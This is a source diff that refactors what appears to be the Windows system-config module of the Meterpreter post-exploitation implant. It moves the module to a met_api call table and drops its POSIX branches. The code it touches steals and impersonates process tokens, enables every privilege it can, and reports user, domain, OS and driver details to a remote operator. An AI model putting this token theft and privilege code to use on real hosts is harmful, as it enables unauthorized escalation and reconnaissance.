@@ -1,17 +1,11 @@
 #include "precomp.h"
+#include "common_metapi.h"
 
-#ifdef _WIN32
-#include <Sddl.h>
-#include <Lm.h>
+#include <sddl.h>
+#include <lm.h>
 #include <psapi.h>
 
 typedef NTSTATUS(WINAPI *PRtlGetVersion)(LPOSVERSIONINFOEXW);
-
-#else
-#include <sys/utsname.h>
-#endif
-
-#pragma comment(lib, "netapi32.lib")
 
 /*!
  * @brief Add an environment variable / value pair to a response packet.
@@ -33,7 +27,7 @@ VOID add_env_pair(Packet *response, char * envVar, char *envVal)
 		entries[1].header.length = (DWORD)strlen(envVal) + 1;
 		entries[1].buffer = (PUCHAR)envVal;
 
-		packet_add_tlv_group(response, TLV_TYPE_ENV_GROUP, entries, 2);
+		met_api->packet.add_tlv_group(response, TLV_TYPE_ENV_GROUP, entries, 2);
 	}
 	else
 	{
@@ -51,7 +45,7 @@ VOID add_env_pair(Packet *response, char * envVar, char *envVal)
  */
 DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD dwResult = ERROR_SUCCESS;
 	DWORD dwTlvIndex = 0;
 	Tlv envTlv;
@@ -60,7 +54,7 @@ DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
 
 	do
 	{
-		while (ERROR_SUCCESS == packet_enum_tlv(packet, dwTlvIndex++, TLV_TYPE_ENV_VARIABLE, &envTlv))
+		while (ERROR_SUCCESS == met_api->packet.enum_tlv(packet, dwTlvIndex++, TLV_TYPE_ENV_VARIABLE, &envTlv))
 		{
 			pEnvVarStart = (char*)envTlv.buffer;
 
@@ -92,20 +86,28 @@ DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
 			dprintf("[ENV] Final env var: %s", pEnvVarStart);
 
 			// grab the value of the variable and stick it in the response.
-			add_env_pair(response, pEnvVarStart, getenv(pEnvVarStart));
+			PWCHAR name = met_api->string.utf8_to_wchar(pEnvVarStart);
+			//Ensure we always have > 0 bytes even if env var doesn't exist
+			DWORD envlen = GetEnvironmentVariableW(name, NULL, 0) + 1;
+			PWCHAR wvalue = (PWCHAR)malloc(envlen * sizeof(WCHAR));
+			GetEnvironmentVariableW(name, wvalue, envlen);
+			free(name);
+			char* value = met_api->string.wchar_to_utf8(wvalue);
+			free(wvalue);
+			add_env_pair(response, pEnvVarStart, value);
+			free(value);
 
 			dprintf("[ENV] Env var added");
 		}
 	} while (0);
 
 	dprintf("[ENV] Transmitting response.");
-	packet_transmit_response(dwResult, remote, response);
+	met_api->packet.transmit_response(dwResult, remote, response);
 
 	dprintf("[ENV] done.");
 	return dwResult;
 }
 
-#ifdef _WIN32
 /*
  * @brief Get the token information for the current thread/process.
  * @param pTokenUser Buffer to receive the token data.
@@ -150,7 +152,7 @@ DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
 	DWORD dwResult;
 	BYTE tokenUserInfo[4096];
 	LPSTR pSid = NULL;
-	Packet *pResponse = packet_create_response(pRequest);
+	Packet *pResponse = met_api->packet.create_response(pRequest);
 
 	do
 	{
@@ -169,11 +171,11 @@ DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
 
 	if (pSid != NULL)
 	{
-		packet_add_tlv_string(pResponse, TLV_TYPE_SID, pSid);
+		met_api->packet.add_tlv_string(pResponse, TLV_TYPE_SID, pSid);
 		LocalFree(pSid);
 	}
 
-	packet_transmit_response(dwResult, pRemote, pResponse);
+	met_api->packet.transmit_response(dwResult, pRemote, pResponse);
 
 	return dwResult;
 }
@@ -189,7 +191,8 @@ DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
 DWORD populate_uid(Packet* pResponse)
 {
 	DWORD dwResult;
-	CHAR cbUsername[1024], cbUserOnly[512], cbDomainOnly[512];
+	WCHAR cbUserOnly[512], cbDomainOnly[512];
+	CHAR cbUsername[1024];
 	BYTE tokenUserInfo[4096];
 	DWORD dwUserSize = sizeof(cbUserOnly), dwDomainSize = sizeof(cbDomainOnly);
 	DWORD dwSidType = 0;
@@ -206,23 +209,26 @@ DWORD populate_uid(Packet* pResponse)
 			break;
 		}
 
-		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)tokenUserInfo)->User.Sid, cbUserOnly, &dwUserSize, cbDomainOnly, &dwDomainSize, (PSID_NAME_USE)&dwSidType))
+		if (!LookupAccountSidW(NULL, ((TOKEN_USER*)tokenUserInfo)->User.Sid, cbUserOnly, &dwUserSize, cbDomainOnly, &dwDomainSize, (PSID_NAME_USE)&dwSidType))
 		{
 			BREAK_ON_ERROR("[GETUID] Failed to lookup the account SID data");
 		}
 
+		char *domainName = met_api->string.wchar_to_utf8(cbDomainOnly);
+		char *userName = met_api->string.wchar_to_utf8(cbUserOnly);
  		// Make full name in DOMAIN\USERNAME format
-		_snprintf(cbUsername, 512, "%s\\%s", cbDomainOnly, cbUserOnly);
+		_snprintf(cbUsername, 512, "%s\\%s", domainName, userName);
+		free(domainName);
+		free(userName);
 		cbUsername[511] = '\0';
 
-		packet_add_tlv_string(pResponse, TLV_TYPE_USER_NAME, cbUsername);
+		met_api->packet.add_tlv_string(pResponse, TLV_TYPE_USER_NAME, cbUsername);
 
 		dwResult = EXIT_SUCCESS;
 	} while (0);
 
 	return dwResult;
 }
-#endif
 
 /*
  * @brief Get the user name of the current process/thread.
@@ -232,27 +238,13 @@ DWORD populate_uid(Packet* pResponse)
  */
 DWORD request_sys_config_getuid(Remote* pRemote, Packet* pPacket)
 {
-	Packet *pResponse = packet_create_response(pPacket);
+	Packet *pResponse = met_api->packet.create_response(pPacket);
 	DWORD dwResult = ERROR_SUCCESS;
 
-#ifdef _WIN32
 	dwResult = populate_uid(pResponse);
-#else
-	CHAR info[512];
-	uid_t ru, eu, su;
-	gid_t rg, eg, sg;
-
-	ru = eu = su = rg = eg = sg = 31337;
-
-	getresuid(&ru, &eu, &su);
-	getresgid(&rg, &eg, &sg);
-
-	snprintf(info, sizeof(info)-1, "uid=%d, gid=%d, euid=%d, egid=%d, suid=%d, sgid=%d", ru, rg, eu, eg, su, sg);
-	packet_add_tlv_string(pResponse, TLV_TYPE_USER_NAME, info);
-#endif
 
 	// Transmit the response
-	packet_transmit_response(dwResult, pRemote, pResponse);
+	met_api->packet.transmit_response(dwResult, pRemote, pResponse);
 
 	return dwResult;
 }
@@ -265,18 +257,14 @@ DWORD request_sys_config_getuid(Remote* pRemote, Packet* pPacket)
  */
 DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
 {
-	Packet* pResponse = packet_create_response(pPacket);
+	Packet* pResponse = met_api->packet.create_response(pPacket);
 	DWORD dwResult = ERROR_SUCCESS;
 
-#ifdef _WIN32
-	core_update_thread_token(pRemote, NULL);
+	met_api->thread.update_token(pRemote, NULL);
 	dwResult = populate_uid(pResponse);
-#else
-	dwResult = ERROR_NOT_SUPPORTED;
-#endif
 
 	// Transmit the response
-	packet_transmit_response(dwResult, pRemote, pResponse);
+	met_api->packet.transmit_response(dwResult, pRemote, pResponse);
 
 	return dwResult;
 }
@@ -290,48 +278,56 @@ DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
  */
 DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
-#ifdef _WIN32
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD res = ERROR_SUCCESS;
 	HANDLE token = NULL;
 	int x;
-	TOKEN_PRIVILEGES priv = {0};
+	TOKEN_PRIVILEGES priv = { 0 };
 	LPCTSTR privs[] = {
-		SE_DEBUG_NAME,
-		SE_TCB_NAME,
-		SE_CREATE_TOKEN_NAME,
 		SE_ASSIGNPRIMARYTOKEN_NAME,
-		SE_LOCK_MEMORY_NAME,
-		SE_INCREASE_QUOTA_NAME,
-		SE_UNSOLICITED_INPUT_NAME,
-		SE_MACHINE_ACCOUNT_NAME,
-		SE_SECURITY_NAME,
-		SE_TAKE_OWNERSHIP_NAME,
-		SE_LOAD_DRIVER_NAME,
-		SE_SYSTEM_PROFILE_NAME,
-		SE_SYSTEMTIME_NAME,
-		SE_PROF_SINGLE_PROCESS_NAME,
-		SE_INC_BASE_PRIORITY_NAME,
+		SE_AUDIT_NAME,
+		SE_BACKUP_NAME,
+		SE_CHANGE_NOTIFY_NAME,
+		SE_CREATE_GLOBAL_NAME,
 		SE_CREATE_PAGEFILE_NAME,
 		SE_CREATE_PERMANENT_NAME,
-		SE_BACKUP_NAME,
-		SE_RESTORE_NAME,
-		SE_SHUTDOWN_NAME,
-		SE_AUDIT_NAME,
-		SE_SYSTEM_ENVIRONMENT_NAME,
-		SE_CHANGE_NOTIFY_NAME,
-		SE_REMOTE_SHUTDOWN_NAME,
-		SE_UNDOCK_NAME,
-		SE_SYNC_AGENT_NAME,
+		SE_CREATE_SYMBOLIC_LINK_NAME,
+		SE_CREATE_TOKEN_NAME,
+		SE_DEBUG_NAME,
 		SE_ENABLE_DELEGATION_NAME,
+		SE_IMPERSONATE_NAME,
+		SE_INC_BASE_PRIORITY_NAME,
+		SE_INCREASE_QUOTA_NAME,
+		SE_INC_WORKING_SET_NAME,
+		SE_LOAD_DRIVER_NAME,
+		SE_LOCK_MEMORY_NAME,
+		SE_MACHINE_ACCOUNT_NAME,
 		SE_MANAGE_VOLUME_NAME,
-		0
+		SE_PROF_SINGLE_PROCESS_NAME,
+		SE_RELABEL_NAME,
+		SE_REMOTE_SHUTDOWN_NAME,
+		SE_RESTORE_NAME,
+		SE_SECURITY_NAME,
+		SE_SHUTDOWN_NAME,
+		SE_SYNC_AGENT_NAME,
+		SE_SYSTEM_ENVIRONMENT_NAME,
+		SE_SYSTEM_PROFILE_NAME,
+		SE_SYSTEMTIME_NAME,
+		SE_TAKE_OWNERSHIP_NAME,
+		SE_TCB_NAME,
+		SE_TIME_ZONE_NAME,
+		SE_TRUSTED_CREDMAN_ACCESS_NAME,
+		SE_UNDOCK_NAME,
+		SE_UNSOLICITED_INPUT_NAME,
+		NULL
 	};
 
 	do
 	{
-		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))  {
+		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+		{
 			res = GetLastError();
+			dprintf("[GETPRIVS] Failed to open the process token: %u 0x%x", res, res);
 			break;
 		}
 
@@ -341,23 +337,28 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 			LookupPrivilegeValue(NULL, privs[x], &priv.Privileges[0].Luid);
 			priv.PrivilegeCount = 1;
 			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-			if(AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0)) {
-				if(GetLastError() == ERROR_SUCCESS) {
-					packet_add_tlv_string(response, TLV_TYPE_PRIVILEGE, privs[x]);
+			if (AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0))
+			{
+				if (GetLastError() == ERROR_SUCCESS)
+				{
+					dprintf("[GETPRIVS] Got Priv %s", privs[x]);
+					met_api->packet.add_tlv_string(response, TLV_TYPE_PRIVILEGE, privs[x]);
 				}
-			} else {
-				dprintf("[getprivs] Failed to set privilege %s (%u)", privs[x], GetLastError());
+			}
+			else
+			{
+				dprintf("[GETPRIVS] Failed to set privilege %s (%u)", privs[x], GetLastError());
 			}
 		}
 	} while (0);
 
-	if(token)
+	if (token)
+	{
 		CloseHandle(token);
-#else
-	DWORD res = ERROR_NOT_SUPPORTED;
-#endif
+	}
+
 	// Transmit the response
-	packet_transmit_response(res, remote, response);
+	met_api->packet.transmit_response(res, remote, response);
 
 	return res;
 }
@@ -370,9 +371,8 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
  */
 DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD dwResult = ERROR_SUCCESS;
-#ifdef _WIN32
 	HANDLE hToken = NULL;
 	HANDLE hProcessHandle = NULL;
 	HANDLE hDupToken = NULL;
@@ -381,7 +381,7 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 	do
 	{
 		// Get the process identifier that we're attaching to, if any.
-		dwPid = packet_get_tlv_value_uint(packet, TLV_TYPE_PID);
+		dwPid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PID);
 
 		if (!dwPid)
 		{
@@ -399,7 +399,7 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 			break;
 		}
 
-		if (!OpenProcessToken(hProcessHandle, TOKEN_ALL_ACCESS, &hToken))
+		if (!OpenProcessToken(hProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
 		{
 			dwResult = GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", dwPid, dwResult);
@@ -413,7 +413,7 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 			break;
 		}
 
-		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
+		if (!DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
 		{
 			dwResult = GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", dwPid, dwResult);
@@ -421,7 +421,7 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 		}
 
 		dprintf("[STEAL-TOKEN] so far so good, updating thread token");
-		core_update_thread_token(remote, hDupToken);
+		met_api->thread.update_token(remote, hDupToken);
 
 		dprintf("[STEAL-TOKEN] populating UID");
 		dwResult = populate_uid(response);
@@ -436,16 +436,12 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 	{
 		CloseHandle(hToken);
 	}
-#else
-	dwResult = ERROR_NOT_SUPPORTED;
-#endif
 	// Transmit the response
-	packet_transmit_response(dwResult, remote, response);
+	met_api->packet.transmit_response(dwResult, remote, response);
 
 	return dwResult;
 }
 
-#ifdef _WIN32
 DWORD add_windows_os_version(Packet** packet)
 {
 	DWORD dwResult = ERROR_SUCCESS;
@@ -548,7 +544,7 @@ DWORD add_windows_os_version(Packet** packet)
 		{
 			if (v.dwMinorVersion == 0)
 			{
-				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 10" : "Windows 2016";
+				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 10" : "Windows 2016+";
 			}
 		}
 
@@ -559,20 +555,19 @@ DWORD add_windows_os_version(Packet** packet)
 
 		if (wcslen(v.szCSDVersion) > 0)
 		{
-			_snprintf(buffer, sizeof(buffer)-1, "%s (Build %lu, %S).", osName, v.dwBuildNumber, v.szCSDVersion);
+			_snprintf(buffer, sizeof(buffer)-1, "%s (%u.%u Build %u, %S).", osName, v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber, v.szCSDVersion);
 		}
 		else
 		{
-			_snprintf(buffer, sizeof(buffer)-1, "%s (Build %lu).", osName, v.dwBuildNumber);
+			_snprintf(buffer, sizeof(buffer)-1, "%s (%u.%u Build %u).", osName, v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber);
 		}
 
 		dprintf("[VERSION] Version set to: %s", buffer);
-		packet_add_tlv_string(*packet, TLV_TYPE_OS_NAME, buffer);
+		met_api->packet.add_tlv_string(*packet, TLV_TYPE_OS_NAME, buffer);
 	} while (0);
 
 	return dwResult;
 }
-#endif
 
 /*
  * @brief Handle the request to get local date/time information.
@@ -582,11 +577,10 @@ DWORD add_windows_os_version(Packet** packet)
  */
 DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD result = ERROR_SUCCESS;
 	char dateTime[128] = { 0 };
 
-#ifdef _WIN32
 	TIME_ZONE_INFORMATION tzi = { 0 };
 	SYSTEMTIME localTime = { 0 };
 
@@ -598,20 +592,12 @@ DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
 		localTime.wHour, localTime.wMinute, localTime.wSecond, localTime.wMilliseconds,
 		tziResult == TIME_ZONE_ID_DAYLIGHT ? tzi.DaylightName : tzi.StandardName,
 		tzi.Bias > 0 ? "-" : "+", abs(tzi.Bias / 60 * 100));
-#else
-	time_t t = time(NULL);
-	struct tm lt = { 0 };
-	localtime_r(&t, &lt);
-	// TODO: bug? Ping @bcook-r7
-	// For some reason I don't see the correct TZ name/offset coming through. Bionic issue?
-	strftime(dateTime, sizeof(dateTime) - 1, "%Y-%m-%d %H:%M:%S %Z (UTC%z)", &lt);
-#endif
 
 	dprintf("[SYSINFO] Local Date/Time: %s", dateTime);
-	packet_add_tlv_string(response, TLV_TYPE_LOCAL_DATETIME, dateTime);
+	met_api->packet.add_tlv_string(response, TLV_TYPE_LOCAL_DATETIME, dateTime);
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 
 	return result;
 }
@@ -624,8 +610,7 @@ DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
  */
 DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
-#ifdef _WIN32
+	Packet *response = met_api->packet.create_response(packet);
 	CHAR computer[512], buf[512], * osArch = NULL;
 	DWORD res = ERROR_SUCCESS;
 	DWORD size = sizeof(computer);
@@ -643,7 +628,7 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 			break;
 		}
 
-		packet_add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, computer);
+		met_api->packet.add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, computer);
 		add_windows_os_version(&response);
 
 		// sf: we dynamically retrieve GetNativeSystemInfo & IsWow64Process as NT and 2000 dont support it.
@@ -681,7 +666,7 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 		}
 
 		dprintf("[SYSINFO] Arch set to: %s", osArch);
-		packet_add_tlv_string(response, TLV_TYPE_ARCHITECTURE, osArch);
+		met_api->packet.add_tlv_string(response, TLV_TYPE_ARCHITECTURE, osArch);
 
 		if (hKernel32)
 		{
@@ -716,7 +701,7 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 				_snprintf(buf, sizeof(buf)-1, "%s_%s", langname, ctryname);
 			}
 
-			packet_add_tlv_string(response, TLV_TYPE_LANG_SYSTEM, buf);
+			met_api->packet.add_tlv_string(response, TLV_TYPE_LANG_SYSTEM, buf);
 
 			if (ctryname)
 			{
@@ -733,9 +718,9 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 
 		if (NetWkstaGetInfo(NULL, 102, (LPBYTE *)&localSysinfo) == NERR_Success)
 		{
-			char *domainName = wchar_to_utf8(localSysinfo->wki102_langroup);
-			packet_add_tlv_string(response, TLV_TYPE_DOMAIN, (LPCSTR)domainName);
-			packet_add_tlv_uint(response, TLV_TYPE_LOGGED_ON_USER_COUNT, localSysinfo->wki102_logged_on_users);
+			char *domainName = met_api->string.wchar_to_utf8(localSysinfo->wki102_langroup);
+			met_api->packet.add_tlv_string(response, TLV_TYPE_DOMAIN, (LPCSTR)domainName);
+			met_api->packet.add_tlv_uint(response, TLV_TYPE_LOGGED_ON_USER_COUNT, localSysinfo->wki102_logged_on_users);
 			free(domainName);
 		}
 		else
@@ -743,31 +728,9 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 			dprintf("[CONFIG] Failed to get local system info for logged on user count / domain");
 		}
 	} while (0);
-#else
-	CHAR os[512];
 
-	DWORD res = ERROR_SUCCESS;
-
-	do {
-		struct utsname utsbuf;
-		if (uname(&utsbuf) == -1) {
-			res = GetLastError();
-			break;
-		}
-
-		snprintf(os, sizeof(os), "%s %s %s %s (%s)",
-			utsbuf.sysname, utsbuf.nodename, utsbuf.release,
-			utsbuf.version, utsbuf.machine);
-
-		packet_add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, utsbuf.nodename);
-		packet_add_tlv_string(response, TLV_TYPE_OS_NAME, os);
-		packet_add_tlv_string(response, TLV_TYPE_ARCHITECTURE, utsbuf.machine);
-
-	} while(0);
-
-#endif
 	// Transmit the response
-	packet_transmit_response(res, remote, response);
+	met_api->packet.transmit_response(res, remote, response);
 
 	return res;
 }
@@ -780,22 +743,21 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
  */
 DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
 {
-#ifdef _WIN32
 	DWORD dwResult    = ERROR_SUCCESS;
 	Packet * response = NULL;
 
 	do
 	{
-		response = packet_create_response(packet);
+		response = met_api->packet.create_response(packet);
 		if (!response)
 		{
 			dwResult = ERROR_INVALID_HANDLE;
 			break;
 		}
 
-		core_update_thread_token(remote, NULL);
+		met_api->thread.update_token(remote, NULL);
 
-		core_update_desktop(remote, -1, NULL, NULL);
+		met_api->desktop.update(remote, -1, NULL, NULL);
 
 		if (!RevertToSelf())
 			dwResult = GetLastError();
@@ -803,11 +765,7 @@ DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
 	} while(0);
 
 	if (response)
-		packet_transmit_response(dwResult, remote, response);
-
-#else
-	DWORD dwResult = ERROR_NOT_SUPPORTED;
-#endif
+		met_api->packet.transmit_response(dwResult, remote, response);
 
 	return dwResult;
 }
@@ -817,10 +775,9 @@ DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
  */
 DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 {
-	Packet* response = packet_create_response(packet);
+	Packet* response = met_api->packet.create_response(packet);
 	DWORD result = ERROR_SUCCESS;
 
-#ifdef _WIN32
 	LPVOID ignored = NULL;
 	DWORD sizeNeeded = 0;
 
@@ -873,17 +830,17 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 
 					if (valid)
 					{
-						Packet* entry = packet_create_group();
+						Packet* entry = met_api->packet.create_group();
 
-						char* bn = wchar_to_utf8(baseName);
-						packet_add_tlv_string(entry, TLV_TYPE_DRIVER_BASENAME, bn);
+						char* bn = met_api->string.wchar_to_utf8(baseName);
+						met_api->packet.add_tlv_string(entry, TLV_TYPE_DRIVER_BASENAME, bn);
 						free(bn);
 
-						char* fn = wchar_to_utf8(fileName);
-						packet_add_tlv_string(entry, TLV_TYPE_DRIVER_FILENAME, fn);
+						char* fn = met_api->string.wchar_to_utf8(fileName);
+						met_api->packet.add_tlv_string(entry, TLV_TYPE_DRIVER_FILENAME, fn);
 						free(fn);
 
-						packet_add_group(response, TLV_TYPE_DRIVER_ENTRY, entry);
+						met_api->packet.add_group(response, TLV_TYPE_DRIVER_ENTRY, entry);
 					}
 				}
 			}
@@ -895,11 +852,8 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 			result = ERROR_OUTOFMEMORY;
 		}
 	}
-#else
-	result = ERROR_NOT_SUPPORTED;
-#endif
 
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 
 	return ERROR_SUCCESS;
 }
